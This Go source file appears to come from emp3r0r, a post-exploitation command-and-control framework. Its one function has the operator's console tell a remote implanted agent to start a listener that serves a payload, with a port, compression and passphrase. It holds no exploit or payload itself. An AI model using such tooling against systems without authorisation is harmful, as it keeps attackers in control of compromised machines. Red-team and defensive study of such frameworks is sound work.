package modules

import (
	"fmt"

	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func modListener() {
	if live.ActiveModule.Options["listener"] == nil || live.ActiveModule.Options["port"] == nil || live.ActiveModule.Options["payload"] == nil || live.ActiveModule.Options["compression"] == nil || live.ActiveModule.Options["passphrase"] == nil {
		logging.Errorf("One or more required options are nil")
		return
	}
	cmd := fmt.Sprintf("%s --listener %s --port %s --payload %s --compression %s --passphrase %s",
		def.C2CmdListener,
		live.ActiveModule.Options["listener"].Val,
		live.ActiveModule.Options["port"].Val,
		live.ActiveModule.Options["payload"].Val,
		live.ActiveModule.Options["compression"].Val,
		live.ActiveModule.Options["passphrase"].Val)
	err := CmdSender(cmd, "", live.ActiveAgent.Tag)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}
